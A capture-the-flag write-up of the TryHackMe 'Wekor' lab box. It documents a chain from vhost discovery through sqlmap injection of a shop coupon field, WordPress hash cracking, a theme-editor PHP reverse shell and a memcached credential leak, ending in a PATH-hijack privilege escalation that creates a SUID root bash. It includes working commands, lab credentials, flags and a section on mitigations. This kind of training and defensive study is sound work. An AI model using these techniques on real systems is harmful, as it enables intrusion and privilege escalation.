# THM — Wekor

```
██╗    ██╗███████╗██╗  ██╗ ██████╗ ██████╗ 
██║    ██║██╔════╝██║ ██╔╝██╔═══██╗██╔══██╗
██║ █╗ ██║█████╗  █████╔╝ ██║   ██║██████╔╝
██║███╗██║██╔══╝  ██╔═██╗ ██║   ██║██╔══██╗
╚███╔███╔╝███████╗██║  ██╗╚██████╔╝██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
                 TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 80 (HTTP)
- [x] `robots.txt` → `/comingreallysoon/` → pointer to the `site.wekor.thm` vhost
- [x] Found a custom "it-next" shop app and a WordPress install under the vhost
- [x] SQL injection in the shop's coupon field (`it_cart.php`, `coupon_code`)
- [x] sqlmap dumped the `coupons` and `wordpress` databases
- [x] Cracked WordPress user `wp_yura`'s phpass hash → `soccer13`
- [x] Logged into WordPress as yura, uploaded a PHP reverse shell → www-data
- [x] Found a local memcached (127.0.0.1:11211) leaking `Orka`'s credentials
- [x] `su Orka` with `OrkAiSC00L24/7$` → user flag
- [x] `sudo -l`: Orka may run a SUID `bitcoin` binary as root
- [x] `bitcoin` calls `python` by relative path; `/usr/sbin` is Orka-writable and on `secure_path`
- [x] PATH-hijacked `python` → SUID root bash → root flag

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| feroxbuster / ffuf | Directory and vhost discovery |
| sqlmap | Dumping the shop and WordPress databases |
| John the Ripper | Cracking the WordPress phpass hash |
| WordPress theme editor | Planting a PHP reverse shell |
| nc | Reverse shell listener and memcached client |
| objdump / strings | Reading the `bitcoin` binary's password and `system()` call |

---

## TL;DR

Wekor's web root hides a vhost, `site.wekor.thm`, running a custom "it-next" shop and a WordPress blog. The shop's coupon field (`it_cart.php`, `coupon_code`) is SQL-injectable; sqlmap dumps the `wordpress` database, and WordPress user `wp_yura`'s phpass hash cracks to `soccer13`. Logging into WordPress as yura and editing a theme file to a PHP reverse shell gives a www-data shell. On the box, a local memcached instance (127.0.0.1:11211) is caching the `Orka` user's credentials in plaintext (`OrkAiSC00L24/7$`), so `su Orka` gets the user flag. Orka may `sudo` a root-owned `bitcoin` binary, which internally runs `python /home/Orka/Desktop/transfer.py` by **relative** path; since `/usr/sbin` is group-writable by Orka and sits on sudo's `secure_path`, dropping a malicious `python` there and running the binary executes it as root — a SUID root bash and the root flag.

---

## Introduction

Wekor is a hard, long Linux box that is really five smaller challenges back-to-back: vhost discovery, a SQL-injectable custom shop, WordPress credential cracking, a reverse shell, and then two privilege escalations (an information leak through memcached, and a PATH-hijack of a sudo-able binary). Nothing requires a 0-day, but you have to chain carefully and not get lost — the web surface is deliberately noisy, and the final escalation hinges on spotting that a privileged binary calls an interpreter by a name rather than a full path.

---

## Recon

### Port Scan

```bash
rustscan -a 10.48.175.59 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
```

Only 22 (SSH) and 80 (HTTP, Apache 2.4.18 on Ubuntu 16.04).

### Web discovery

```bash
feroxbuster -u http://10.48.175.59/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,js,json
```

`robots.txt` lists several bait paths, but the real lead is `/comingreallysoon/`, which hints that the site has moved to a virtual host. Adding `site.wekor.thm` to `/etc/hosts` and browsing it reveals a custom shop application under `/it-next/` and a WordPress install under `/wordpress/`.

---

## Foothold

### SQL injection in the shop

The shop's cart accepts a coupon code. That `coupon_code` POST parameter is injectable:

```bash
sqlmap -u "http://10.48.175.59/it-next/it_cart.php" \
  --data="coupon_code=1&apply_coupon=Apply+Coupon" --batch
```

```
Payload: coupon_code=1' UNION ALL SELECT NULL,CONVERT(...),NULL#&apply_coupon=Apply Coupon
back-end DBMS: MySQL >= 5.6
available databases [6]: coupons, information_schema, mysql, performance_schema, sys, wordpress
```

The `wordpress` database is the prize. Dumping `wp_users`:

```bash
sqlmap -u "http://10.48.175.59/it-next/it_cart.php" --data="coupon_code=1&apply_coupon=Apply+Coupon" --batch -D wordpress -T wp_users --dump
```

```
| user_login | user_pass                                      |
| admin      | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.             |
| wp_jeffrey | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10            |
| wp_yura    | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/   (soccer13) |
| wp_eagle   | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/             |
```

### Cracking the hash

sqlmap/John recognised the phpass hashes and cracked `wp_yura` against rockyou:

```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 wp.txt
# wp_yura : soccer13
```

---

## Shell / Initial Access

WordPress user `wp_yura` can log in at `site.wekor.thm/wordpress/wp-login.php` with `soccer13`. yura has theme-editing rights, so I replaced a theme PHP file (e.g. `404.php`) with a PHP reverse shell, started a listener, and triggered the page:

```bash
nc -lvnp 4444
```

```
Connection received ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@osboxes:/$
```

A home directory exists for `Orka`, but it's locked down to www-data:

```bash
www-data@osboxes:/$ ls -la /home/Orka/user.txt
# Permission denied
```

So www-data needs to become Orka.

---

## Escalation Path

Two hops:

1. **www-data → Orka** via credentials leaked from a local memcached cache.
2. **Orka → root** via a sudo-able binary that calls `python` by relative path, combined with a writable `secure_path` directory.

---

## Exploitation

### www-data → Orka (memcached leak)

Enumerating local services turned up memcached listening on `127.0.0.1:11211`. memcached has no authentication; its keys can be listed and read directly:

```bash
printf 'get username\r\n' | nc 127.0.0.1 11211
# VALUE username 0 4
# Orka
printf 'get password\r\n' | nc 127.0.0.1 11211
# VALUE password 0 15
# OrkAiSC00L24/7$
```

The app had cached the `Orka` user's own login in memcached in plaintext:

```bash
su Orka      # password: OrkAiSC00L24/7$
Orka@osboxes:/tmp$ cat ~/user.txt
1a26a6d51c0172400add0e297608dec6
```

### Orka → root (sudo binary + relative `python` + writable secure_path)

```bash
sudo -l
# User Orka may run the following commands on osboxes:
#     (root) /home/Orka/Desktop/bitcoin
```

`bitcoin` is a 32-bit ELF. `strings`/`objdump` show two things: the password check is a plain `strcmp` against the literal `password`, and after a correct password it calls:

```
system("python /home/Orka/Desktop/transfer.py %c")
```

It invokes `python` by name, not by absolute path, so it relies on `$PATH` (here, sudo's `secure_path`). Checking the directories on `secure_path`:

```bash
ls -ld /usr/sbin /usr/local/sbin
# drwxrwxr-x 2 root Orka 12288 ... /usr/sbin        <-- group Orka, group-writable
```

`/usr/sbin` is writable by the `Orka` group and comes before `/usr/bin` on `secure_path`. So I plant a malicious `python` there that makes a SUID copy of bash, then run the sudo binary with the known password and any valid amount:

```bash
cat > /usr/sbin/python <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /usr/sbin/python

echo -e 'password\n1' | sudo /home/Orka/Desktop/bitcoin
# Enter the password : Access Granted...
```

`bitcoin` runs as root, calls `python ...`, and resolves `python` to my script — which runs as root:

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash
/tmp/rootbash -p
rootbash-4.3# cat /root/root.txt
f4e788f87cc3afaecbaf0f0fe9ae6ad7
```

Root.

---

## Rabbit Holes

**robots.txt bait and LFI guesses.** `robots.txt` and early fuzzing surface a lot of paths (`workshop`, `agent`, `feed`, `crawler`, etc.) and an `index.php?page=` that looked LFI-able via `php://filter`. None of it is the way in — the real lead is the `/comingreallysoon/` pointer to the `site.wekor.thm` vhost. Don't sink time into every path a wordlist returns.

**The other WordPress users.** `admin`, `wp_jeffrey` and `wp_eagle` hashes came out of the dump too. `wp_eagle` even cracked, but `wp_yura` is the account that matters (theme-edit path to a shell). More cracked hashes isn't more progress unless the account can do something.

**Kernel exploits for root.** With a www-data shell I briefly went down the kernel-exploit road (CVE-2021-22555 netfilter, CVE-2022-32250) — compiling 32-bit exploits, fighting multilib. That's the wrong path: the box wants the memcached leak → Orka → sudo binary chain. On a box this curated, an unauthenticated local service (memcached on 11211) and a `sudo -l` entry are far likelier intended routes than a kernel LPE. Enumerate services and sudo before reaching for kernel CVEs.

**Entering the `bitcoin` password interactively.** Early `sudo bitcoin` runs returned "Access Denied" because I guessed the password. It's recoverable statically — the binary `strcmp`s the input against the literal string `password`. Reading the binary beats guessing.

---

## Flag

| Flag | Value |
|---|---|
| user.txt (Orka) | `1a26a6d51c0172400add0e297608dec6` |
| root.txt | `f4e788f87cc3afaecbaf0f0fe9ae6ad7` |

---

## Mitigations

**SQL injection in the shop.** The `coupon_code` parameter is concatenated into a query. Use parameterised queries / prepared statements everywhere, and apply least-privilege to the DB account so one injectable form can't read the entire `wordpress` database.

**Weak WordPress passwords.** `soccer13` falls to rockyou instantly. Enforce strong passwords, limit login attempts, and don't give every author theme/plugin-edit rights — `DISALLOW_FILE_EDIT` in `wp-config.php` removes the theme-editor-to-webshell path entirely.

**Unauthenticated memcached caching secrets.** memcached on `127.0.0.1:11211` had no auth and cached a user's credentials in plaintext. Never cache secrets in memcached; bind it to a socket or firewall it, and treat anything in it as readable by any local user.

**sudo binary calling an interpreter by relative name.** `bitcoin` running `system("python ...")` with a bare `python` is the root cause. Privileged programs must call interpreters and helpers by absolute path and sanitise `$PATH`. Equally, `/usr/sbin` must not be group-writable, and it certainly must not be writable by a user who is on `secure_path`.

**A hard-coded password in a binary.** The `bitcoin` access check is a `strcmp` against a literal — trivially recovered. Authentication secrets do not belong compiled into a distributed binary.

---

## Key Takeaway

Wekor is an exercise in not getting lost. The web layer is noisy on purpose; the discipline is to follow the one real lead (the vhost) and the one real bug (the coupon SQLi) instead of every path a scanner prints. The two escalations are both "information and trust" problems rather than exploits: memcached hands you a password because nothing stops it, and the sudo binary runs as root but trusts `$PATH` to find `python`. 

The escalation lesson worth keeping: when a privileged binary calls another program by name (not absolute path), check every writable directory on the effective `$PATH`/`secure_path`. A single group-writable directory like `/usr/sbin` turns "I can run this as root" into "I control what runs as root."

---

## If I Did It Again

Enumerate local services and `sudo -l` *before* touching kernel exploits. The memcached on 11211 and the `(root) bitcoin` sudo entry are the intended path; the time spent on CVE-2021-22555/CVE-2022-32250 was wasted on a curated box that clearly wanted the service-leak chain.

Read the `bitcoin` binary first instead of guessing its password — one `strings`/`objdump` pass shows both the literal password and the relative `python` call, which hands you the entire escalation in a minute.

On the web side, pin on the vhost immediately: `/comingreallysoon/` is the signpost, and `ffuf` with a `Host:` header confirms `site.wekor.thm`. Everything real lives there, so there's no need to exhaust the root site's wordlist first.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-16 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
